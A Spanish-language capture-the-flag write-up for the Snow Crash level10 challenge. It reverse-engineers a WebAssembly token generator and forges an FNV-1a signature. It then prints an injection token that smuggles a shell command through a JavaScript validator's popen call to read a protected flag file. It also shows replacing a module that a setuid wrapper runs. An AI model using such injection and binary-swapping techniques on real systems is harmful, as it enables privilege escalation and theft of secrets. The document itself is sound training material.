# Level10 - Snow Crash

## Tipo de ejercicio

Boss fight obligatorio: reconstrucción de un token generado por WebAssembly
y explotación de una inyección de comandos en un handler JavaScript.

## Objetivo

Obtener la flag final del recorrido mandatory. Después comienza la parte bonus
con `bonus01`, cuyas credenciales se investigan por separado.

Este nivel encadena dos tecnologías: `enzo.wasm` genera la entrada y
`validate.js` la valida y despacha a un comando del sistema.

## 1. Analizar la cadena de ejecución

Los archivos del nivel son:

```bash
find /opt/snowcrash/level10 -maxdepth 2 -ls 2>/dev/null
```

Resultado relevante:

```text
/opt/snowcrash/level10/enzo.wasm
/opt/snowcrash/level10/enzo_runner
/opt/snowcrash/level10/pipeline.sh
/opt/snowcrash/level10/validate.js
```

La tubería normal es:

```bash
wasmtime /opt/snowcrash/level10/enzo.wasm | qjs /opt/snowcrash/level10/validate.js
```

`wasmtime` ejecuta `enzo.wasm`, que escribe el token por la salida estándar.
El símbolo `|` conecta esa salida con la entrada estándar del siguiente
programa. `qjs` inicia QuickJS y ejecuta `validate.js`, que recibe y valida el
texto generado por el módulo. Así el token pasa directamente del productor
(WASM) al validador (JavaScript), sin guardarlo primero en un archivo.

`wasmtime` es un runtime: carga y ejecuta módulos WebAssembly (`.wasm`).
`qjs` es el intérprete de línea de comandos de QuickJS: ejecuta el programa
JavaScript `validate.js`.

`enzo_runner` es un pequeño lanzador (wrapper): prepara la ejecución con los
permisos adecuados y después inicia la tubería de WebAssembly y JavaScript.
Comprobamos sus permisos y buscamos pistas sobre los programas que inicia:

```bash
ls -l /opt/snowcrash/level10/enzo_runner
strings -a /opt/snowcrash/level10/enzo_runner
```

En la salida de `ls -l`, comprueba el propietario `flag10` y si aparece una
`s` en los permisos de ejecución del propietario: esa letra indica `setuid`.

`strings -a` extrae secuencias de texto legibles del binario. De su salida nos
interesan estas líneas:

```text
setresgid
setresuid
pipe
fork
dup2
enzo_runner: setresuid
/usr/local/bin/wasmtime
enzo_runner: execl wasmtime
/usr/bin/qjs
enzo_runner: execl qjs
/opt/snowcrash/level10/enzo.wasm
/opt/snowcrash/level10/validate.js
```

`setresuid` y `setresgid` son pistas de que el lanzador ajusta sus credenciales
de usuario y grupo. `pipe`, `fork` y `dup2` son operaciones para crear
procesos y conectar sus entradas y salidas. Las rutas y los mensajes `execl`
identifican los programas que lanza (`wasmtime` y `qjs`) y los archivos que
les pasa. `strings` muestra estas pistas legibles, no el flujo completo; el
propietario `flag10` y el bit `setuid` se comprueban aparte con `ls -l`.

## 2. Reconstruir el token del WASM

`enzo.wasm` es un módulo WebAssembly binario, difícil de inspeccionar como
texto. `wasm2wat` lo convierte a su representación textual, WAT. La opción
`-o /tmp/enzo.wat` guarda esa representación temporal en la OVA; no modifica
el módulo original ni añade un binario al repositorio. Así podemos leer las
instrucciones del módulo y averiguar cómo construye la entrada que recibe el
validador:

```bash
wasm2wat /opt/snowcrash/level10/enzo.wasm -o /tmp/enzo.wat
cat /tmp/enzo.wat
```

`cat` muestra en el terminal el WAT generado. La salida es larga; dentro de la
función `_start` aparecen instrucciones escritas en WAT, la representación
textual de WebAssembly. Por ejemplo, estas instrucciones escriben `v1:` en la
memoria del módulo:

```wat
i32.const 8
i32.const 118
i32.store8
i32.const 9
i32.const 49
i32.store8
i32.const 10
i32.const 58
i32.store8
```

`i32.store8` guarda un byte en la dirección indicada: los valores ASCII `118`,
`49` y `58` corresponden a `v`, `1` y `:`. Más adelante, el WAT escribe dos
`0` (`48`) en las posiciones 11 y 12, codifica ocho caracteres del campo en
las posiciones 13–20, escribe otro `:` en la posición 21 y codifica ocho
caracteres de la firma en las posiciones 22–29. En la posición 30 escribe un
salto de línea (`10`). Por eso la salida tiene esta forma:

```text
v1:00<8 caracteres del campo>:<8 caracteres de la firma>
```

El módulo añade un salto de línea al final. El campo se deriva de
`enzosecret`; la firma se calcula sobre los 10 caracteres del campo (`00` más
los ocho caracteres codificados). La normalización de `validate.js` elimina el
salto de línea al validar, lo que explica por qué la salida original no valida
tal cual.

El validador calcula la firma con FNV-1a:

```javascript
const expected = (_hash(xs[1]) >>> 0).toString(16).padStart(8,'0')
```

`const expected` guarda la firma que el validador espera para el campo
`xs[1]` (la parte del token situada entre los dos primeros `:`). `_hash`
calcula el hash de ese campo. `>>> 0` lo interpreta como un entero sin signo;
`toString(16)` lo escribe en hexadecimal y `padStart(8, '0')` añade ceros a la
izquierda hasta completar ocho caracteres. El resultado se compara con la
firma incluida en el token.

## 3. Identificar los handlers vulnerables

Los comandos de ejemplo de abajo son esquemas, no código literal de JavaScript.
Para ver en qué parte del validador se elige el handler y se forma el comando,
buscamos esas cadenas y las llamadas que lo ejecutan:

```bash
grep -n -C 4 -E 'logger|systemctl reload|ping -c1|xs\[1\]|exec|spawn' \
	/opt/snowcrash/level10/validate.js
```

`-n` muestra los números de línea y `-C 4` añade contexto alrededor de cada
coincidencia.

```text
40-const _normalize     = t => _schema.transforms.reduce((x,f) => f(x), t)
41-const _split         = t => t.includes(':') ? Ok(t.split(':')) : Err('malformed')
42-const _validateV     = xs => xs[0] === 'v1' ? Ok(xs) : Err('unsupported version: ' + xs[0])
43-const _validateL     = xs => xs.length === 3 ? Ok(xs) : Err('invalid field count')
44:const _checkReserved = xs => _schema.reserved.includes(xs[1])
45-    ? Err('reserved identifier') : Ok(xs)
46-
47-const _verify = xs => {
48:    const expected = (_hash(xs[1]) >>> 0).toString(16).padStart(8,'0')
49-    return xs[2] === expected ? Ok(xs) : Err('signature mismatch')
50-}
51-
52-const _k0 = _hash('1fc').toString(36)
53-const _k1 = _hash('1d0').toString(36)
54-const _k2 = _hash('1a4').toString(36)
55-
56-const _dispatch = _F({
57:    [_k0]: _b(x => std.popen(x, 'r'))(_c(x => y => x + y)('logger\x20-t\x20appd\x20')),
58-    [_k1]: _b(x => std.popen(x, 'r'))(_c(x => y => x + y)('systemctl\x20reload\x20')),
59-    [_k2]: _b(x => std.popen(x, 'r'))(_c(x => y => x + y)('ping\x20-c1\x20')),
60-})
61-
--
68-    r => r.chain(_verify),
69-    r => r.chain(xs => {
70-        const _key = _hash(xs[0].slice(1) + xs[2].slice(0,2)).toString(36)
71-        const action = _dispatch[_key]
72:        return action ? Ok(action(xs[1])) : Err('no handler')
73-    })
74-)
75-
76-const token = std.in.getline()
```

Los comandos que el validador construye tienen esta forma:

```text
logger -t appd <campo>
systemctl reload <campo>
ping -c1 <campo>
```

La salida muestra el recorrido del dato:

1. Las líneas 41–49 separan el token en partes y comprueban que la firma
	corresponde al campo `xs[1]`.
2. Las líneas 70–72 calculan la clave `_key`, buscan con ella un handler en
	`_dispatch` y llaman a ese handler pasando `xs[1]`.
3. Las líneas 57–59 definen los handlers: cada uno concatena su prefijo
	(`logger`, `systemctl` o `ping`) con el campo y lo entrega a `std.popen`.

El campo se incorpora sin escapar. Por eso, si contiene `;`, el shell puede
interpretarlo como separador e intentar ejecutar otro comando. Para llegar al
handler, el token debe superar primero la validación de firma y su clave debe
seleccionar ese handler. En el ejemplo de esta resolución se selecciona
`logger`.

## 4. Crear el token de inyección

El recurso auxiliar [find_injection_token.py](find_injection_token.py) se creó
expresamente durante la resolución; no viene en la OVA. Sirve para probar
sufijos hasta encontrar uno que produzca una firma cuyo prefijo seleccione el
handler `logger`. Desde la raíz del repositorio, en el equipo anfitrión, se
ejecuta así:

```bash
python3 level10/resources/find_injection_token.py
```

El script calcula la firma FNV-1a de cada candidato y se detiene cuando
encuentra una que empieza por `fc`. Ese prefijo hace que el validador derive
la clave del handler `logger`. El token que imprime el script es:

```text
v1:x1f;cat /home/flag10/.flag > /tmp/level10_flag.txt;#:fc8c9815
```

Así se relaciona este token con el handler, paso a paso:

1. Al separarlo por `:`, `validate.js` obtiene `xs[0] = v1`, `xs[1]` igual al
	campo que contiene el comando y `xs[2] = fc8c9815`.
2. En la línea 70, `xs[0].slice(1)` toma el `1` de `v1` y
	`xs[2].slice(0,2)` toma `fc` de la firma. Juntos forman `1fc`.
3. El validador calcula el hash de `1fc` en base36. El resultado es `bx3o9j`.
	En las líneas 52–59, esa misma clave (`_k0`) está asociada al handler cuyo
	prefijo es `logger -t appd`.
4. La línea 72 entrega `xs[1]` a ese handler. Como el campo contiene `;`, el
	shell interpreta lo que sigue como otro comando.

La firma completa `fc8c9815` se valida antes, en las líneas 47–49; su prefijo
`fc` participa además en la selección del handler.

## 5. Emitir el token con WebAssembly

El archivo [enzo-injection.wat](enzo-injection.wat) es un recurso auxiliar
creado expresamente para resolver este nivel; no viene en la OVA. Contiene un
módulo WAT que emite exactamente el token anterior. Para usarlo, se transfiere a la OVA y se compila allí como WASM. 

Primero, desde una terminal del equipo anfitrión (no desde la sesión SSH), situado en la raíz del repositorio, se transfiere el archivo:

```bash
scp -P 2424 level10/resources/enzo-injection.wat \
	level10@localhost:/tmp/enzo-injection.wat
```

Después, dentro de la sesión SSH de `level10@snowcrash`:

```bash
wat2wasm /tmp/enzo-injection.wat -o /tmp/enzo-injection.wasm
cp /opt/snowcrash/level10/enzo.wasm /tmp/enzo-original.wasm
cp /tmp/enzo-injection.wasm /opt/snowcrash/level10/enzo.wasm
```

`wat2wasm` convierte el módulo textual en un binario que `wasmtime` puede
ejecutar. El primer `cp` guarda el WASM original en `/tmp` para poder
restaurarlo. El segundo copia el módulo de inyección a la ruta que usa el
servicio, reemplazando temporalmente el original.

El reemplazo es temporal sobre el servidor en ejecución y aprovecha que el
grupo `level10` puede escribir `enzo.wasm`. No se modifica la imagen `.ova` ni
se guarda ningún `.wasm` en el repositorio.

## 6. Ejecutar y recuperar la credencial

El wrapper ejecuta el módulo como `flag10`:

```bash
/opt/snowcrash/level10/enzo_runner
cat /tmp/level10_flag.txt
```

El resultado fue:

```text
g457ws0du8osi4t4tlea00cxe
```

## 7. Restaurar el servidor y cerrar el recorrido obligatorio

Se restaura inmediatamente el WASM original:

```bash
cp /tmp/enzo-original.wasm /opt/snowcrash/level10/enzo.wasm
```

Las cuentas bonus existen en la OVA y se pueden comprobar con:

```bash
getent passwd bonus01 bonus02 bonus03 bonus04 bonus05
```

El boss fight `level10` cierra el recorrido mandatory. La flag
`g457ws0du8osi4t4tlea00cxe` permite continuar con la investigación de
`bonus01`, pero no es su contraseña de acceso.

## Conclusión

`level10` encadena un módulo WASM manipulable con un validador JavaScript que
construye comandos con datos no escapados. Se reconstruyó el formato del token,
se calculó una firma válida que selecciona `logger`, se inyectó `cat` y se
restauró el WASM original tras recuperar la flag final del recorrido.
